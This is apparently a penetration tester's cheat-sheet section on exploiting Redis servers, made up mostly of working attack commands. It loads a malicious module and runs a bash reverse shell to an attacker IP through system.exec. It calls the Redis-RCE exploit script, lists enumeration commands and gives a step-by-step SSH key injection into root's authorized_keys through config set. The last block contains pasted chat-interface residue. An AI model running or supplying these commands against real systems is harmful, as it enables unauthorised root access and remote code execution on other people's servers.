### Redis

```bash
cd RedisModules-ExecuteCommand
make

# Transfer file onto system through ftp
redis-cli -h $ip
MODULE LOCAL /var/ftp/pub/module.so
system.exec "id"
system.exec "bash -i >& /dev/tcp/192.168.45.178/80 0>&1"
```

```bash
# https://github.com/jas502n/Redis-RCE
python redis-rce.py -r $ip -p 6379 -L 192.168.45.178 -P 80 --file ./exp.so
```

```bash
info
AUTH <username> <password>
client list
CONFIG GET *
INFO keyspace # get databases
KEYS * 
GET <KEY>
```

"https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html"

```bash
Generate SSH Keys
We generated an SSH key pair on our attacker machine, which would allow us to log in to the target once injected.

bash
Copy code
ssh-keygen -t rsa -f redis_key -N ""
This created the following files:

redis_key (private key)
redis_key.pub (public key)
Step 3: Format the Public Key for Injection
We modified the public key to be compatible with Redis commands.

bash
Copy code
cat redis_key.pub | sed 's/^/SET ssh_key /' > redis_payload.txt
Step 4: Write the SSH Key to the Target System
We used Redis to inject the public key into the .ssh/authorized_keys file on the target system.

bash
Copy code
cat redis_payload.txt | redis-cli -h 192.168.120.110
redis-cli -h 192.168.120.110 config set dir /root/.ssh/
redis-cli -h 192.168.120.110 config set dbfilename "authorized_keys"
redis-cli -h 192.168.120.110 save
This overwrote the authorized_keys file with our public key.

Accessing the Target via SSH
With the SSH key successfully injected, we used the private key to log into the Redis server as root.

bash
Copy code
ssh -i redis_key root@192.168.120.110
Output:

ruby
Copy code
root@192.168.120.110:~# whoami
root
```